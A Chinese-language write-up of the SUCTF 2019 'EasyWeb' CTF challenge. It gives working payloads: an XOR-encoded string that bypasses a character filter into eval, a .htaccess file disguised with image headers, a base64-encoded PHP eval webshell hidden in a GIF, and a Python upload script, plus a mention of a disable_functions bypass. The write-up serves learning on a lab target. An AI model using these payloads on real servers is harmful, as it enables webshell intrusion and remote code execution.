# \[SUCTF 2019]EasyWeb

## \[SUCTF 2019]EasyWeb

## 考点

* PHP传参特性，PHP参数传递特性，PHP参数污染，PHP的字符串解析特性
* .htaccess特性
* .htaccess在没有\<?的情况下制作图片马

## wp

给了源码

```php
<?php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET['_'];

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');

$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");

eval($hhh);
?>
```

两个部分，一个要执行get\_the\_flag函数，一个要绕文件上传

### 第一部分

传入参数长度小于等于18，并且由不超过12个字符组成。这些字符不包括这些

```
ASCII范围不包含
0-32，48-57，65-90，97-122，127
还有
'"`~_&.,|=[
```

![](<../.gitbook/assets/image (21) (1) (1).png>)

可以看出来没有过滤的是`$^{}%();`等等。一般来说，PHP传参是`$_GET["a"]`这种形式，但是在PHP7也可以这样`${_GET}{a}`

paylaod: `_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo` 相当于 `_=${_GET}{%ff}();&%ff=phpinfo`

### 第二部分

文件上传，后缀不能有`ph`，上传的文件内容不能有`<?`，并且会用`exif_imagetype`函数对上传文件进行检测

后缀不能有`ph`，那就是`.htaccess`或者`.user.ini`

内容不包含`<?`那就是`<script language="php">`，但是在PHP7被弃用

不确定中间件不确定PHP版本，看一下phpinfo，得到信息<mark style="color:orange;">`PHP7.2`</mark>和<mark style="color:orange;">`apache2`</mark>，REMOTE\_ADDR是10.244.80.46

![](<../.gitbook/assets/image (7) (1).png>)

这样思路就明确了，上传`.htaccess`让服务器把图片文件解析成木马，但有几个问题

* `.htaccess`格式很严格，加上图片头文件apache是解析不了的，如何让它被识别成图片
* 图片文件在没有`<?`的情况下如何写马

<mark style="background-color:orange;">第一个问题有两个方法</mark>

一是

```
#define width 1337
#define height 1337
```

二是

`.htaccess`文件前加上16进制的`x00x00x8ax39x8ax39`，也即wbmp文件的开头，并且`.htaccess`文件中以`0x00`开头是注释符

<mark style="background-color:orange;">第二个问题是用</mark>`.htaccess`文件的`auto_append_file`包含base64解码的shell

.htaccess

```
#define width 1337
#define height 1337 
AddType application/x-httpd-php .gif
php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/shell.gif"
```

shell.gif

```
GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2EnXSk7Pz4=
```

然后上传可以用POSTman或者脚本都可以

```python
import requests
import base64

htaccess = b"""#define width 1337
#define height 1337 
AddType application/x-httpd-php .gif
php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/shell.gif"
"""
shell = b"GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2EnXSk7Pz4="
url = "http://fd0b9d5f-f8d6-4615-8a64-5c5eac845091.node4.buuoj.cn:81/?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=get_the_flag"

files = {'file':('.htaccess',htaccess,'image/jpeg')}
data = {"upload":"Submit"}
response = requests.post(url=url, data=data, files=files)
print(response.text)

files = {'file':('shell.gif',shell,'image/jpeg')}
response = requests.post(url=url, data=data, files=files)
print(response.text)

```

连接成功后发现权限好像不对，输什么都是返回ret=127，看了一下phpinfo，是要进行bypass\_disable\_function，用蚁剑自带的插件就可以。因为是PHP7.2，所以用了PHP7 Backtrace UAF进行bypass。

![](<../.gitbook/assets/image (16) (1) (1).png>)

## 小结

1. PHP传参是`$_GET["a"]`这种形式，但是在<mark style="color:orange;">PHP7</mark>也可以这样`${_GET}{a}`
2. 用`.htaccess`文件的`auto_append_file`可以包含base64解码的shell
